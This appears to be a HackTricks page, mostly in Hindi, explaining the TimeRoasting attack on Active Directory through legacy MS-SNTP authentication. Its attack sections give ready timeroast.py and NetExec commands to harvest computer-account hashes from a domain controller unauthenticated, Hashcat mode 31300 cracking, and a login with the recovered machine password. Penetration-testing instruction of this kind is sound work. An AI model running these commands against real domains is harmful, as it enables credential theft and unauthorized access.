# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting legacy MS-SNTP authentication का दुरुपयोग करता है। एक unauthenticated client चुने गए computer-account RID वाला 68-byte request भेज सकता है। Exploitable legacy path के लिए, domain controller Netlogon के माध्यम से computer account के NT hash (MD4-derived password secret) का उपयोग करके response authenticator प्राप्त करता है, जिससे attacker को offline password guessing (Hashcat mode 31300) के लिए उपयुक्त challenge/MAC pair मिलता है।<sup>[[1]](#references)[[2]](#references)</sup>

MS-SNTP के Sections 3.1.5.1 और 4 request तथा response behavior का वर्णन करते हैं:<sup>[[1]](#references)</sup>
![TimeRoasting: विवरण के लिए official MS-SNTP spec में section 3.1.5.1 "Authentication Request Behavior" और 4 "Protocol Examples" देखें](../../images/Pasted%20image%2020250709114508.png)
जब `ExtendedAuthenticatorSupported` false होता है, तब request authenticator के Key Identifier के low 31 bits में RID और high bit में एक selector bit store करता है। Server 68-byte length verify करता है, RID extract करता है, candidate checksums compute करने के लिए Netlogon को अनुरोध करता है, उस high bit का उपयोग करके एक checksum select करता है, response Key Identifier को zero करता है और selected checksum return करता है।<sup>[[1]](#references)</sup>

Crypto-checksum MD5-based है (3.2.5.1.1 देखें) और इसे offline crack किया जा सकता है, जिससे roasting attack संभव होता है।<sup>[[1]](#references)</sup>

## How to Attack

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Tom Tervoort द्वारा Timeroasting scripts<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## NetExec + Hashcat के साथ व्यावहारिक attack (unauth)

- NetExec का `timeroast` module computer RIDs enumerate कर सकता है, authentication के बिना MS-SNTP MACs collect कर सकता है, और cracking के लिए तैयार `$sntp-ms$` hashes print कर सकता है:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Hashcat mode 31300 (MS-SNTP MAC) के साथ offline crack करें:<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Recovered cleartext एक computer account password से संबंधित है। जब NTLM disabled हो, तो इसे सीधे machine account के रूप में Kerberos (-k) का उपयोग करके आज़माएँ:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### Operational notes
- Kerberos के साथ recovered credentials का उपयोग करने से पहले सही time सुनिश्चित करें। `chronyd`/`systemd-timesyncd` जैसे maintained NTP client को प्राथमिकता दें; `ntpdate` को यहाँ एक सामान्य lab command के रूप में रखा गया है: `sudo ntpdate <dc_fqdn>`.
- आवश्यकता होने पर AD realm के लिए krb5.conf generate करें: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- किसी भी authenticated foothold के बाद LDAP/BloodHound के माध्यम से बाद में RIDs को principals से map करें।

## References

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — `timeroast` module source](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
